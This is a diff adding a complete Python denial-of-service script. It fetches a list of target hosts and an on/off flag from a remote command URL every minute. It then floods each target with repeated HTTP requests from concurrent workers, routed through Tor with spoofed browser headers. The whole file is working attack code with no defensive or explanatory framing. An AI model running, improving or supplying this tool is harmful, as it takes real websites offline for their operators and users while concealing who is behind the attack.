@@ -1,0 +1,119 @@
+#!/usr/bin/python3 -B
+
+'''
+python async tor DDOS
+2022.02.28
+'''
+
+import random
+import asyncio
+import aiohttp
+import random
+import json
+from aiohttp_socks import ProxyConnector
+
+
+MaxTasks = 10
+MasterUrl = 'http://vpn2.oster.com.ua/www/temp/attack.json'
+
+
+class TAttack():
+    def __init__(self, aParent, aUrl: str):
+        self.Parent = aParent
+        self.Url = aUrl
+        self.CntAll = 0
+        self.CntErr = 0
+
+        self.Event = asyncio.Event()
+        self.Wait(False)
+
+    def _GetHeaders(self) -> dict:
+        OSs = ['Macintosh; Intel Mac OS X 10_15_5', 'Windows NT 10.0; Win64; x64; rv:77', 'Linux; Intel Ubuntu 20.04']
+        Browsers = ['Chrome/83', 'Firefox/77', 'Opera/45']
+
+        OS = OSs[random.randint(0, len(OSs) - 1)]
+        Browser = Browsers[random.randint(0, len(Browsers)) - 1]
+        return {
+            'Accept': '*/*',
+            'User-Agent': 'Mozilla/5.0 (%s) %s' % (OS, Browser)
+        }
+
+    def _GetConnector(self, aProxy: bool):
+        Proxy = 'socks5://localhost:9050'
+        if (aProxy):
+            return ProxyConnector.from_url(Proxy)
+
+    async def _Worker(self, aSession, aTaskId: int):
+        self.IsRun = True
+        while (self.IsRun):
+            await self.Event.wait()
+
+            self.CntAll += 1
+            try:
+                async with aSession.get(self.Url, headers=self._GetHeaders()) as Response:
+                    Data = await Response.read()
+                    print('Count:%4d, TaskId:%3d, Status:%d, Size:%dK, URL:%s' % (self.CntAll, aTaskId, Response.status, len(Data)/1000, self.Url))
+            except Exception as E:
+                self.CntErr += 1
+                print('Error', self.CntErr, self.Url, E)
+            await asyncio.sleep(1)
+
+    def Wait(self, aEnable: bool):
+        if (aEnable):
+            self.Event.clear()
+        else:
+            self.Event.set()
+
+    async def Run(self, aMaxTasks: int):
+        async with aiohttp.ClientSession(connector=self._GetConnector(True)) as Session:
+            Tasks = [asyncio.create_task(self._Worker(Session, i)) for i in range(aMaxTasks)]
+            await asyncio.gather(*Tasks)
+
+
+class TMain():
+    def __init__(self):
+        self.Tasks = []
+        self.Task_Create = None
+
+    async def LoadUrl(self, aUrl: str) -> bytes:
+        try:
+            async with aiohttp.ClientSession() as Session:
+                async with Session.get(aUrl) as Response:
+                    return await Response.read()
+        except Exception as E:
+            print('Err. TMain.LoadUrl()', E)
+
+    async def Create(self, aUrls: list):
+        self.Tasks = []
+        for Url in aUrls:
+            Attack = TAttack(self, Url)
+            Task = asyncio.create_task(Attack.Run(MaxTasks))
+            self.Tasks.append([Attack, Task])
+
+    def Cancel(self):
+        for Attack, Task in self.Tasks:
+            Task.cancel()
+            del Attack
+        self.Tasks = []
+
+    def Wait(self, aEnable: bool):
+        for Attack, Task in self.Tasks:
+            Attack.Wait(aEnable)
+
+    async def Run(self):
+        while (True):
+            Data = await self.LoadUrl(MasterUrl)
+            Data = json.loads(Data.decode())
+            self.Wait(not Data.get('run'))
+            Hosts = Data.get('hosts')
+            if (len(Hosts) != len(self.Tasks)):
+                self.Cancel()
+                await asyncio.sleep(1)
+
+                if (self.Task_Create):
+                    self.Task_Create.cancel()
+                self.Task_Create = asyncio.create_task(self.Create(Hosts))
+
+            await asyncio.sleep(60)
+
+asyncio.run(TMain().Run())
